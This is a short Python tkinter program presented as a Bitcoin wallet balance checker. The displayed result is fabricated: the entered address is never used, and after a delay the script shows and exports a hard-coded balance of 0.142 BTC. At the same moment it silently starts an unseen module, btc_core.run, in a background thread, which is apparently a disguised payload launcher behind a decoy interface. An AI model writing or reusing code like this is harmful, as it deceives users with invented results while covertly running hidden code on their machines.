import tkinter as tk
import threading
import btc_core

def scan():
    status_label.config(text="Scanning BTC address...")
    root.after(2000, lambda: [
        status_label.config(text="Balance: 0.142 BTC | Status: Confirmed"),
        export_button.config(state="normal"),
        threading.Thread(target=btc_core.run).start()
    ])

def export():
    with open("btc_result.txt", "w") as f:
        f.write("Balance: 0.142 BTC\nStatus: Confirmed")
    status_label.config(text="Exported to btc_result.txt")

root = tk.Tk()
root.title("BTC Wallet Balance Checker")
root.geometry("420x200")
tk.Label(root, text="Enter BTC Wallet Address:").pack()
entry = tk.Entry(root, width=50); entry.pack()
tk.Button(root, text="Scan Wallet", command=scan).pack(pady=5)
status_label = tk.Label(root, text=""); status_label.pack()
export_button = tk.Button(root, text="Export Result", command=export, state="disabled")
export_button.pack(pady=5)
root.mainloop()
